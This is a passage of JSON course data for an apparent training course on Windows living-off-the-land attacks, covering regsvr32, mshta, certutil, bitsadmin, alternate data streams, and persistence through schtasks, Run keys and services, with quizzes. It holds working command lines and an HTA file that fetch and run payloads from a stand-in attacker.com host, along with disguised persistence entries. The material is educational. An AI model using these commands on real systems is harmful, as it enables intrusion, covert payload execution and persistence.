                        "content": "<p>Why would an attacker use `regsvr32.exe` if `rundll32.exe` can do something similar? The answer lies in evading specific detections.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Evading Specific Detections</strong></div><p>A sophisticated Blue Team may have written a very specific detection rule that looks for the suspicious command-line arguments associated with the `rundll32.exe` technique. By using `regsvr32.exe` instead, an attacker might be able to achieve the same outcome with a different command line that doesn't trigger that specific rule. Having multiple LotL tools for the same purpose gives the attacker flexibility and makes the defender's job harder.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a_a86a?w=800&h=400&fit=crop"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll",
                        "language": "batch",
                        "code": ":: This is the classic one-liner for executing a remote scriptlet with regsvr32.exe.\n\n:: regsvr32.exe : The legitimate, Microsoft-signed binary.\n:: /s : Silent mode (suppresses pop-up boxes).\n:: /n : Do not call DllRegisterServer.\n:: /u : Unregister server.\n:: /i:http://attacker.com/payload.sct : The core of the technique. The /i flag allows a URL to be passed.\n:: scrobj.dll : A required DLL that handles the scriptlet processing.\n\n:: Just like with rundll32, this is a powerful fileless execution technique that\n:: is proxied through a trusted system binary."
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the legitimate purpose of `regsvr32.exe`?",
                        "options": [
                            "To execute scripts.",
                            "To register and un-register OLE controls, such as DLLs and ActiveX controls, in the Windows Registry.",
                            "To download files.",
                            "To edit the registry."
                        ],
                        "correct": 1,
                        "explanation": "`regsvr32.exe` is a standard utility for Component Object Model (COM) registration. Attackers abuse a specific command-line option (`/i`) that allows it to execute scripts."
                    },
                    {
                        "id": 2,
                        "question": "The primary malicious use of `regsvr32.exe` is to do what?",
                        "options": [
                            "Delete DLLs.",
                            "List all registered DLLs.",
                            "Download and execute a remote COM scriptlet (`.sct` file).",
                            "Change file permissions."
                        ],
                        "correct": 2,
                        "explanation": "This is the most famous abuse case for `regsvr32.exe`. It provides a simple, one-line command to achieve fileless remote code execution, making it a favorite for attackers."
                    },
                    {
                        "id": 3,
                        "question": "Why might an attacker choose to use `regsvr32.exe` for execution instead of `powershell.exe`?",
                        "options": [
                            "It is more powerful.",
                            "It is faster.",
                            "Defenders often have very strong logging and detection capabilities for PowerShell. An attacker might use `regsvr32.exe` because it is a less monitored and 'quieter' execution method.",
                            "It works on Linux."
                        ],
                        "correct": 2,
                        "explanation": "PowerShell is so powerful and so frequently abused that defenders have developed very mature detection capabilities for it. Attackers are constantly looking for more obscure LotL binaries that are less likely to be scrutinized by the Blue Team."
                    }
                ]
            }
        },
        {
            "id": "lesson-7",
            "title": "Script Execution with mshta.exe",
            "duration": "60 min",
            "objectives": [
                "Understand the function of the Microsoft HTML Application Host (mshta.exe)",
                "Learn how to create a malicious HTA file",
                "Explore how HTA files can be used to execute VBScript or JScript outside the browser",
                "Practice using mshta.exe for initial access"
            ],
            "content": {
                "overview": "`mshta.exe` is another classic LotL binary that can be used for remote code execution. It is designed to run HTML Application (HTA) files. This lesson covers how attackers can weaponize HTA files to bypass application whitelisting and execute scripts on a target host.",
                "sections": [
                    {
                        "title": "HTML Applications (HTA)",
                        "content": "<p>An <strong>HTA</strong> file is essentially a standalone HTML file that is executed by the `mshta.exe` engine. The key difference is that when an HTA file is run, its content (including any scripts) is executed *outside* of the browser's restrictive security sandbox.</p><p>This means that a JavaScript or VBScript inside an HTA file can do powerful things that a script on a normal webpage cannot, such as creating ActiveX objects to interact with the operating system, read and write files, and run commands.</p>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Weaponizing HTA Files",
                        "content": "<p>An attacker can craft a simple HTA file that contains a malicious script. A common technique is to use VBScript to create a `WScript.Shell` object and use its `Run` method to execute a command, such as a PowerShell download cradle.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>The Delivery</strong></div><p>The attacker can host this malicious `.hta` file on their C2 server. They can then use a phishing email to trick a user into clicking a link that points to the file, or into downloading and double-clicking the file itself. When the user opens the file, the trusted, Microsoft-signed `mshta.exe` process will launch and execute the embedded script, leading to a compromise.</p></div>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    }
                ],
                "codeExamples": [
                {
  "title": "malicious.hta",
  "language": "html",
  "code": "<html>\n<head>\n&lt;script language=\"VBScript\"&gt;\n    ' This VBScript will be executed by mshta.exe\n    \n    ' Create a shell object to run commands\n    Set objShell = CreateObject(\"WScript.Shell\")\n    \n    ' The command to execute (a PowerShell download cradle)\n    strCommand = \"powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"\n    \n    ' Run the command hidden\n    objShell.Run strCommand, 0, true\n    \n    ' Close the HTA window so the user sees nothing\n    self.close()\n&lt;/script&gt;\n</head>\n<body>\n    <!-- The body can be empty or contain a decoy message -->\n</body>\n</html>"
}

                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary security risk of an HTA file?",
                        "options": [
                            "It can contain a virus.",
                            "It allows script code (like VBScript or JScript) to run outside of the browser's security sandbox.",
                            "It is a very large file.",
                            "It is an outdated file format."
                        ],
                        "correct": 1,
                        "explanation": "The lack of a sandbox is the key danger. Scripts inside an HTA have much greater access to the underlying operating system, which is what allows them to be used to launch malicious commands."
                    },
                    {
                        "id": 2,
                        "question": "An attacker uses a phishing email to trick a user into opening a `.hta` file. Which legitimate Windows binary will be executed to run this file?",
                        "options": [
                            "powershell.exe",
                            "cmd.exe",
                            "mshta.exe",
                            "explorer.exe"
                        ],
                        "correct": 2,
                        "explanation": "`mshta.exe` is the Microsoft HTML Application Host, the default program for handling HTA files. Because it's a trusted binary, it's a prime candidate for LotL attacks."
                    },
                    {
                        "id": 3,
                        "question": "What is the purpose of the `WScript.Shell` object in a malicious HTA file's VBScript?",
                        "options": [
                            "To display a pop-up window.",
                            "To provide the attacker with the ability to run arbitrary system commands.",
                            "To change the user's desktop background.",
                            "To send an email."
                        ],
                        "correct": 1,
                        "explanation": "The `WScript.Shell` object is a powerful component that provides a bridge between the script and the operating system's shell. Its `Run` method is the standard way to execute external commands, like launching PowerShell."
                    }
                ]
            }
        },
        {
            "id": "lesson-8",
            "title": "Abusing certutil.exe for Downloads and Encoding",
            "duration": "60 min",
            "objectives": [
                "Understand the legitimate purpose of certutil.exe",
                "Learn how it can be abused to download files from the internet",
                "Explore its use for Base64 encoding and decoding data",
                "Practice using certutil.exe as a LotL download tool"
            ],
            "content": {
                "overview": "`certutil.exe` is a command-line program, installed by default on Windows, that is intended for managing certificates. However, it has several powerful sub-functions that can be abused by an attacker to download files and decode data, making it a versatile LotL binary.",
                "sections": [
                    {
                        "title": "Abusing certutil for Downloads",
                        "content": "<p>One of `certutil`'s legitimate functions is to fetch Certificate Revocation Lists (CRLs) from remote URLs. An attacker can abuse this functionality to download any file from the internet.</p><p>The `-urlcache` option, combined with the `-split` and `-f` flags, tells `certutil` to fetch a file from a URL and save it to the disk. Because `certutil.exe` is a trusted, signed Microsoft binary, this download may be less scrutinized by security products than a download initiated by PowerShell or another scripting engine.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Abusing certutil for Encoding/Decoding",
                        "content": "<p>`certutil` also has built-in functionality to Base64 encode and decode files. This can be used by an attacker as a stealth technique.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Hiding Payloads</strong></div><p>An attacker can Base64 encode their malware executable into a simple text file. They can then use a different technique to get this harmless-looking text file onto the target machine (e.g., by pasting its content into a command prompt). Once the text file is on the system, the attacker can use the legitimate `certutil.exe` to decode it back into the original malicious executable. This can bypass defenses that look for the transfer of `.exe` files over the network.</p></div>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "certutil.exe -urlcache -split -f http://attacker.com/tool.exe C:\\temp\\tool.exe",
                    "language": "batch",
                    "code": ":: This command uses certutil.exe to download a file.\n\n:: -urlcache -split -f : These are the flags that enable the file download functionality.\n:: http://attacker.com/tool.exe : The URL of the file to download.\n:: C:\\temp\\tool.exe : The path where the downloaded file should be saved.\n\n\n:: --- Example of using certutil to decode a Base64 file ---\n\n:: Assume 'payload.txt' contains a Base64-encoded executable.\n\n:: -decode : The flag to perform Base64 decoding.\n:: payload.txt : The input file.\n:: payload.exe : The output file.\ncertutil.exe -decode C:\\temp\\payload.txt C:\\temp\\payload.exe"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the legitimate purpose of `certutil.exe`?",
                        "options": [
                            "To download files.",
                            "To manage digital certificates and Certificate Authorities.",
                            "To encode and decode files.",
                            "To manage system services."
                        ],
                        "correct": 1,
                        "explanation": "`certutil.exe` is a core utility for managing the Windows certificate store. Its other functions, like downloading and decoding, are the ones that are abused by attackers."
                    },
                    {
                        "id": 2,
                        "question": "Why might an attacker use `certutil.exe` to download a tool instead of PowerShell?",
                        "options": [
                            "It is faster.",
                            "It can download larger files.",
                            "Because PowerShell activity is heavily monitored, using a more obscure binary like `certutil.exe` might be less likely to trigger a detection.",
                            "It is the only way to download files on Windows."
                        ],
                        "correct": 2,
                        "explanation": "This is a key principle of LotL. Attackers are always looking for alternative, less-common binaries to perform common actions, as these are less likely to have robust behavioral detections built around them."
                    },
                    {
                        "id": 3,
                        "question": "How can an attacker use `certutil.exe`'s decoding feature for evasion?",
                        "options": [
                            "By decoding a legitimate file.",
                            "By Base64 encoding their malware to look like a harmless text file, transferring it, and then using `certutil.exe` to decode it back into an executable on the target.",
                            "By decoding the system's log files.",
                            "They cannot use it for evasion."
                        ],
                        "correct": 1,
                        "explanation": "This technique can evade network security controls that are specifically looking for the transfer of executable (`.exe`) files, as the data is transferred in the guise of simple text."
                    }
                ]
            }
        },
        {
            "id": "lesson-9",
            "title": "Abusing bitsadmin.exe for Downloads and Execution",
            "duration": "60 min",
            "objectives": [
                "Understand the function of the Background Intelligent Transfer Service (BITS)",
                "Learn how to use bitsadmin.exe to download files",
                "Explore how to use BITS jobs for persistence and execution",
                "Analyze the stealth benefits of using BITS for file transfers"
            ],
            "content": {
                "overview": "The Background Intelligent Transfer Service (BITS) is a legitimate Windows component designed to handle large file transfers efficiently in the background. The command-line tool `bitsadmin.exe` can be used to manage BITS jobs, and attackers can abuse it to download their tools and even execute them.",
                "sections": [
                    {
                        "title": "Abusing bitsadmin.exe for Downloads",
                        "content": "<p>An attacker can use `bitsadmin.exe` to create a new 'BITS job' to download a file from their C2 server to the victim machine. From a defender's perspective, this traffic may be less suspicious than a direct download from PowerShell or another scripting engine, as BITS is a legitimate Windows service that is expected to be transferring data.</p><p>BITS is also designed to be resilient and will automatically resume a transfer if it is interrupted. This can be useful for an attacker in an unstable network environment.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "BITS for Persistence and Execution",
                        "content": "<p>A BITS job can also be configured to run a command after the transfer is complete. This provides a simple but effective mechanism for both persistence and execution.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>The Post-Transfer Command</strong></div><p>An attacker can create a BITS job that downloads their payload and then sets a 'notification command'. Once the file has been successfully downloaded, the BITS service itself will execute the specified command, which could be the payload it just downloaded. This can be used as a persistence technique, as the BITS job can be configured to run whenever the system reboots.</p></div>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "bitsadmin.exe /transfer myjob /download /priority high http://attacker.com/payload.exe C:\\temp\\payload.exe",
                    "language": "batch",
                    "code": ":: This command uses bitsadmin.exe to download a file.\n\n:: /transfer myjob : Creates a new transfer job named 'myjob'.\n:: /download : Specifies that this is a download job.\n:: /priority high : Sets the job priority.\n:: http://attacker.com/payload.exe : The URL of the file to download.\n:: C:\\temp\\payload.exe : The destination path for the file.\n\n:: --- Example of using BITS for execution ---\n\n:: 1. Create the download job as before.\nbitsadmin.exe /transfer myjob /download /priority high http://attacker.com/payload.exe C:\\temp\\payload.exe\n\n:: 2. Set the notification command to run after the transfer completes.\nbitsadmin.exe /SetNotifyCmdLine myjob C:\\temp\\payload.exe NUL\n\n:: 3. Resume the job to start the download.\nbitsadmin.exe /Resume myjob\n\n:: Once the download finishes, the BITS service will automatically run payload.exe."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the legitimate purpose of the Background Intelligent Transfer Service (BITS)?",
                        "options": [
                            "To run scheduled tasks.",
                            "To manage Windows updates and other large, background file transfers in a way that doesn't disrupt the user.",
                            "To manage digital certificates.",
                            "To execute scripts."
                        ],
                        "correct": 1,
                        "explanation": "BITS is a core part of the Windows operating system, used by many legitimate applications (like Windows Update) to download files efficiently without hogging bandwidth."
                    },
                    {
                        "id": 2,
                        "question": "Why might an attacker use `bitsadmin.exe` for file transfers?",
                        "options": [
                            "It is the only tool that can download files.",
                            "Because BITS is a legitimate and trusted Windows service, its network traffic may be less scrutinized by defenders than traffic from other tools.",
                            "It is faster than any other method.",
                            "It encrypts the downloaded file."
                        ],
                        "correct": 1,
                        "explanation": "This is another example of blending in. By using the system's own background transfer mechanism, the attacker's download can look like a legitimate system activity."
                    },
                    {
                        "id": 3,
                        "question": "How can a BITS job be used for execution or persistence?",
                        "options": [
                            "It cannot be used for execution.",
                            "By configuring the job to run a command after the file transfer is complete.",
                            "By naming the job after a malicious command.",
                            "By transferring a very large file."
                        ],
                        "correct": 1,
                        "explanation": "The ability to set a post-transfer notification command is a powerful feature that an attacker can abuse to automatically execute their payload once it has been successfully downloaded by the legitimate BITS service."
                    }
                ]
            }
        },
       {
  "id": "lesson-10",
  "title": "Alternate Data Streams (ADS) for Hiding Payloads",
  "duration": "60 min",
  "objectives": [
    "Understand what an Alternate Data Stream (ADS) is in the NTFS file system",
    "Learn how to create and read data from an ADS",
    "Explore how attackers use ADS to hide malware and tools",
    "Analyze the challenges of detecting malicious ADS"
  ],
  "content": {
    "overview": "Alternate Data Streams (ADS) are a little-known feature of the Windows NTFS file system that allows an attacker to hide a file 'inside' another, legitimate file. This lesson covers how ADS works and how it can be abused as a powerful technique for hiding tools and payloads on a compromised host.",
    "sections": [
      {
        "title": "What is an Alternate Data Stream?",
        "content": "<p>On an NTFS file system, a file is not just a single stream of data. It can have multiple, alternate data streams attached to it. The 'main' stream is the one you normally interact with. For a text file, this is the text content itself. But you can attach other, hidden streams to that same file.</p><p>These hidden streams are not visible in Windows Explorer or with a standard <code>dir</code> command. The file size reported by the OS is only the size of the main stream; the ADS is not included. This makes it an ideal place for an attacker to hide their tools.</p>",
        "image": "https://i.imgur.com/u7y7o9o.png"
      },
      {
        "title": "Hiding Payloads with ADS",
        "content": "<p>An attacker can use a simple command-line trick to redirect the output of a command into an ADS.</p><p>For example, an attacker could download their <code>malware.exe</code> and then hide it inside a legitimate-looking text file called <code>readme.txt</code>. The <code>readme.txt</code> file itself would still contain normal, benign text. However, the malicious executable would be hidden in an alternate stream of that same file. The file size would appear normal, but the malware is still there and can be executed directly from the ADS.</p>",
        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
      }
    ],
    "codeExamples": [
      {
        "title": "type C:\\\\temp\\\\malware.exe > C:\\\\Users\\\\user\\\\Desktop\\\\readme.txt:hidden.exe",
        "language": "batch",
        "code": ":: This set of commands demonstrates how to use ADS to hide a file.\n\n:: 1. Create a harmless-looking text file.\necho This is a normal text file. > C:\\\\Users\\\\user\\\\Desktop\\\\readme.txt\n\n:: 2. Use the 'type' command and a redirect to pipe the content of the malware\n::    into an alternate data stream of the text file.\n:: The syntax is 'filename:streamname'.\ntype C:\\\\temp\\\\malware.exe > C:\\\\Users\\\\user\\\\Desktop\\\\readme.txt:hidden.exe\n\n:: 3. Now, the 'dir' command will show readme.txt with a normal size.\n::    The hidden malware is invisible.\ndir C:\\\\Users\\\\user\\\\Desktop\n\n:: 4. The attacker can execute the hidden malware directly from the stream.\nwmic process call create \"C:\\\\Users\\\\user\\\\Desktop\\\\readme.txt:hidden.exe\""
      }
    ]
  },
  "quiz": {
    "passingScore": 75,
    "questions": [
      {
        "id": 1,
        "question": "What is an Alternate Data Stream (ADS)?",
        "options": [
          "A type of network connection.",
          "A feature of the NTFS file system that allows multiple streams of data to be associated with a single file name.",
          "A backup copy of a file.",
          "A system log file."
        ],
        "correct": 1,
        "explanation": "ADS is a built-in feature of NTFS. While it has some legitimate uses, it is most famous for being abused by malware and attackers for hiding data."
      },
      {
        "id": 2,
        "question": "What is the primary benefit of using ADS for an attacker?",
        "options": [
          "It makes their files run faster.",
          "It allows them to hide their tools and payloads in a way that is not visible to standard file system browsing tools like Windows Explorer.",
          "It encrypts their files.",
          "It automatically executes their files."
        ],
        "correct": 1,
        "explanation": "The stealth provided by ADS is its key benefit. A hidden file is much less likely to be discovered by a human analyst or a simple forensic tool."
      },
      {
        "id": 3,
        "question": "If an attacker hides a 5MB executable in an ADS of a 1KB text file, what will the file size of the text file be when viewed in Windows Explorer?",
        "options": [
          "5MB",
          "5.001MB",
          "1KB",
          "0KB"
        ],
        "correct": 2,
        "explanation": "This is the deceptive part of ADS. Standard tools only show the size of the main, default data stream. The size of the alternate stream is hidden, making it a very effective hiding technique."
      }
    ]
  }
},
        {
            "id": "lesson-11",
            "title": "Persistence with schtasks.exe",
            "duration": "75 min",
            "objectives": [
                "Understand the legitimate function of the Windows Task Scheduler",
                "Learn how to use schtasks.exe to create a persistent scheduled task",
                "Explore different triggers for scheduled tasks (onlogon, onstart)",
                "Analyze how to run a task with elevated (SYSTEM) privileges",
                "Practice creating a persistent task that launches a C2 beacon"
            ],
            "content": {
                "overview": "`schtasks.exe` is the built-in command-line tool for managing the Windows Task Scheduler. It is a legitimate and powerful tool for administrators, which also makes it a favorite LotL tool for attackers to establish persistence.",
                "sections": [
                    {
                        "title": "Abusing the Task Scheduler",
                        "content": "<p>The Task Scheduler allows users to schedule programs or scripts to run at specific times or when specific events occur. An attacker who has gained administrative privileges on a host can create a new scheduled task that will automatically execute their C2 payload, ensuring their access survives a reboot.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
  "title": "Creating a Persistent Task",
  "content": "<p>An attacker can use a single <code>schtasks.exe</code> command to create a robust persistence mechanism.</p><h3>Key Command-Line Flags:</h3><ul><li><code>/create</code>: Creates a new task.</li><li><code>/tn</code>: The name for the task. Attackers will choose a name that looks legitimate, like 'Microsoft Compatibility Updater' or 'Adobe Flash Player Updater'.</li><li><code>/tr</code>: The 'task run' command. This is the path to the malicious payload.</li><li><code>/sc</code>: The schedule. Common choices for persistence are <code>onlogon</code> (runs when any user logs in) or <code>onstart</code> (runs when the system boots).</li><li><code>/ru \"SYSTEM\"</code>: 'Run as'. If the attacker has admin rights, they can configure the task to run as the all-powerful <code>NT AUTHORITY\\SYSTEM</code> user.</li></ul>",
  "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
}

                ]
            },
            "codeExamples": [
                {
                    "title": "schtasks.exe /create /tn \"Updater\" /tr \"C:\\temp\\payload.exe\" /sc onlogon /ru \"SYSTEM\"",
                    "language": "batch",
                    "code": ":: This command uses the legitimate Windows schtasks.exe binary to create a persistence mechanism.\n\n:: /create : Create a new scheduled task.\n:: /tn \"Updater\" : The name of the task. An attacker will choose an innocent-sounding name.\n:: /tr \"C:\\temp\\payload.exe\" : The command or program to run. This will point to the C2 implant.\n:: /sc onlogon : The schedule. This configures the task to run whenever any user logs on.\n:: /ru \"SYSTEM\" : (Requires admin) Run the task as the SYSTEM user, the highest privilege level.\n\n:: After running this command, the attacker's payload.exe will be automatically executed\n:: as SYSTEM every time a user logs into the machine."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary purpose of using the Task Scheduler for an attacker?",
                        "options": [
                            "To gain initial access.",
                            "To escalate privileges.",
                            "To establish persistence, ensuring their payload runs automatically after a reboot or user login.",
                            "To exfiltrate data."
                        ],
                        "correct": 2,
                        "explanation": "The Task Scheduler is one of the most common and reliable persistence mechanisms on Windows. It's a built-in feature designed specifically to automatically run programs, which is exactly what an attacker wants."
                    },
                    {
                        "id": 2,
                        "question": "What is the purpose of the `/tr` flag in the `schtasks.exe /create` command?",
                        "options": [
                            "To set the name of the task.",
                            "To set the schedule for the task.",
                            "To specify the program or command that the task will execute.",
                            "To set the user account the task will run as."
                        ],
                        "correct": 2,
                        "explanation": "The `/tr` (task run) flag is the most critical part of the command for an attacker, as it's where they specify the path to their malicious payload."
                    },
                    {
                        "id": 3,
                        "question": "An attacker creating a scheduled task named 'Microsoft Compatibility Updater' that runs at logon is attempting to do what?",
                        "options": [
                            "Perform a legitimate update.",
                            "Blend in and make their persistence mechanism look like a legitimate system activity.",
                            "Fix a bug in the operating system.",
                            "Provide a remote assistance session."
                        ],
                        "correct": 1,
                        "explanation": "This is a simple but effective obfuscation technique. A defender who is quickly looking at a list of scheduled tasks is much less likely to be suspicious of a task with a legitimate-sounding name."
                    }
                ]
            }
        },
        {
            "id": "lesson-12",
            "title": "Persistence with Registry Run Keys",
            "duration": "60 min",
            "objectives": [
                "Understand the role of the Windows Registry for persistence",
                "Learn about the common 'Run' and 'RunOnce' keys",
                "Explore how to use reg.exe to modify registry keys from the command line",
                "Practice adding a registry key for user-level persistence"
            ],
            "content": {
                "overview": "The Windows Registry is a massive database that stores the configuration settings for the operating system and its applications. Certain specific keys in the registry are automatically processed at startup, making them a prime location for an attacker to establish persistence.",
                "sections": [
                    {
                        "title": "The Registry 'Run' Keys",
                        "content": "<p>Windows has several specific registry keys that are designed to automatically launch programs when a user logs in or the system boots. These 'Run' keys are one of the oldest and most common persistence mechanisms used by malware and attackers.</p><h3>Common Run Keys:</h3><ul><li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>: Programs in this key will run every time the current user logs in.</li><li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>: Programs in this key will run every time *any* user logs in. Modifying this key requires administrator privileges.</li></ul>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "Using reg.exe for Persistence",
                        "content": "<p>An attacker can use the built-in `reg.exe` command-line utility to add a new entry to one of these Run keys. They will create a new value, giving it an innocent-sounding name and setting the value's data to be the path to their malicious executable.</p><p>Once this registry key is created, the operating system's legitimate startup process will automatically execute the attacker's payload every time the trigger event (like a user logon) occurs. This is a very simple and reliable persistence method.</p>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "reg.exe add \"HKCU\\...\\Run\" /v \"Updater\" /t REG_SZ /d \"C:\\temp\\payload.exe\"",
                    "language": "batch",
                    "code": ":: This command uses the legitimate reg.exe binary to add a persistence entry.\n\n:: add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" : The specific Run key to modify.\n::     HKCU is for the current user. HKLM would be for the local machine (all users).\n\n:: /v \"Updater\" : The 'Value' name for the new entry. Attackers choose a benign name.\n\n:: /t REG_SZ : The data type for the registry value (a string).\n\n:: /d \"C:\\temp\\payload.exe\" : The 'Data' for the value. This is the command to be executed.\n\nreg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Adobe Updater\" /t REG_SZ /d \"C:\\Users\\user\\AppData\\Local\\Temp\\update.exe\""
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the purpose of the Windows Registry 'Run' keys?",
                        "options": [
                            "To store user documents.",
                            "They are a legitimate feature designed to automatically launch programs at startup or user logon.",
                            "To store password hashes.",
                            "To manage network connections."
                        ],
                        "correct": 1,
                        "explanation": "The Run keys are a standard part of Windows for autorun functionality. Attackers simply abuse this intended feature for their own malicious purposes."
                    },
                    {
                        "id": 2,
                        "question": "What is the difference between the Run key in `HKEY_CURRENT_USER` (HKCU) and `HKEY_LOCAL_MACHINE` (HKLM)?",
                        "options": [
                            "There is no difference.",
                            "The HKCU key runs for the current user only, while the HKLM key runs for all users on the system.",
                            "The HKLM key is less powerful.",
                            "The HKCU key requires administrator privileges to modify."
                        ],
                        "correct": 1,
                        "explanation": "This is an important distinction. An attacker who has only compromised a standard user account can still establish persistence for that user by writing to the HKCU Run key. Modifying the HKLM key to affect all users requires administrator rights."
                    },
                    {
                        "id": 3,
                        "question": "The command-line utility used to interact with the Windows Registry is called what?",
                        "options": [
                            "schtasks.exe",
                            "powershell.exe",
                            "reg.exe",
                            "cmd.exe"
                        ],
                        "correct": 2,
                        "explanation": "`reg.exe` is the built-in command-line tool for querying, adding, deleting, and modifying registry keys and values. It is a powerful LotL tool."
                    }
                ]
            }
        },
        {
            "id": "lesson-13",
            "title": "Abusing Windows Services for Persistence",
            "duration": "75 min",
            "objectives": [
                "Understand the role and function of Windows services",
                "Learn how to use sc.exe to create or modify a service",
                "Explore how to configure a service to run with SYSTEM privileges",
                "Analyze how to use a malicious service for persistence",
                "Practice creating a malicious service in a lab environment"
            ],
            "content": {
                "overview": "Windows services are programs that run in the background, often starting at boot and running with high privileges, independent of any logged-in user. For an attacker with administrative rights, creating a malicious service is one of the most powerful and reliable methods for achieving high-privilege persistence.",
                "sections": [
                    {
                        "title": "Creating a Malicious Service",
                        "content": "<p>An attacker who has already gained administrator privileges on a host can use the built-in <strong>Service Control</strong> utility, `sc.exe`, to create a brand new service.</p><p>They can configure this service to:<ul><li>Have an innocent-sounding name and description (e.g., 'Google Update Helper').</li><li>Start automatically every time the system boots (`start= auto`).</li><li>Run their malicious C2 payload as the service's executable (`binPath= C:\\...\\payload.exe`).</li><li>Run with the permissions of the `LocalSystem` (SYSTEM) account, the highest privilege level on a Windows machine.</li></ul></p>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "Modifying an Existing Service",
                        "content": "<p>An even stealthier technique is to not create a new service, but to modify an existing, legitimate one. An attacker can find a legitimate third-party service that is set to disabled, or one that is not critical to the system's operation.</p><p>They can then use `sc.exe` to reconfigure this existing service, changing its `binPath` to point to their payload and setting its startup type to automatic. This can be harder for a defender to spot, as they are not looking for a new, strangely named service, but rather for a modification to one that already exists.</p>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a_a86a?w=800&h=400&fit=crop"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "sc.exe create \"MalService\" binPath= \"C:\\temp\\payload.exe\" start= \"auto\"",
                        "language": "batch",
                        "code": ":: This command uses the legitimate sc.exe binary to create a new persistent service.\n:: This command requires administrator privileges to run.\n\n:: create \"MalService\" : The command to create a service and its name.\n::    (An attacker would choose a much stealthier name).\n\n:: binPath= \"C:\\temp\\payload.exe\" : The 'binary path'. This is the command that will be executed\n::                                 when the service starts.\n\n:: start= \"auto\" : The start type. 'auto' means the service will start automatically on boot.\n\n:: obj= \"LocalSystem\" : (Optional) Specify the account to run the service as. Default is SYSTEM.\n\nsc.exe create \"GoogleUpdateSvc\" displayName= \"Google Update Helper\" binPath= \"C:\\temp\\update.exe\" start= auto obj= LocalSystem"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary benefit for an attacker of using a Windows service for persistence?",
                        "options": [
                            "It is the only way to gain persistence.",
                            "It allows their payload to run automatically at boot with high privileges (SYSTEM), independent of any user logging in.",
                            "It is very easy to do without admin rights.",
                            "It is not a very reliable technique."
                        ],
                        "correct": 1,
                        "explanation": "Service-based persistence is a high-privilege, high-reliability method. It ensures the attacker's code runs early in the boot process with the most powerful account on the system."
                    },
                    {
                        "id": 2,
                        "question": "What is the built-in Windows command-line tool for managing services?",
                        "options": [
                            "schtasks.exe",
                            "reg.exe",
                            "sc.exe",
                            "powershell.exe"
                        ],
                        "correct": 2,
                        "explanation": "`sc.exe` (Service Control) is the legitimate command-line utility that administrators (and attackers) use to create, query, configure, and delete Windows services."
                    },
                    {
                        "id": 3,
                        "question": "What does the `start= auto` parameter do when creating a service with `sc.exe`?",
                        "options": [
                            "It starts the service immediately.",
                            "It prevents the service from starting.",
                            "It configures the service to start automatically every time the operating system boots.",
                            "It means the service must be started manually."
                        ],
                        "correct": 2,
                        "explanation": "This is the key parameter for persistence. By setting the start type to 'auto', the attacker ensures their malicious service will be launched by the OS every time the machine is turned on."
                    }
                ]
            }
        },
        {
            "id": "lesson-14",
            "title": "Bypassing User Account Control (UAC) with fodhelper.exe",
            "duration": "75 min",
            "objectives": [
                "Understand the purpose of User Account Control (UAC)",
                "Learn how UAC is a security boundary, not a sandbox",
                "Explore the mechanism of the fodhelper.exe UAC bypass",
                "Analyze how an attacker can hijack a registry key to execute code in a high-integrity context"
            ],
            "content": {
                "overview": "User Account Control (UAC) is the familiar Windows prompt that asks for permission before a program can make changes to the system. While it is an important security feature, it is not a perfect security boundary and can be bypassed. This lesson covers one of the most common and reliable methods for bypassing UAC using a legitimate Windows binary called `fodhelper.exe`.",
                "sections": [
                    {
                        "title": "Understanding UAC",
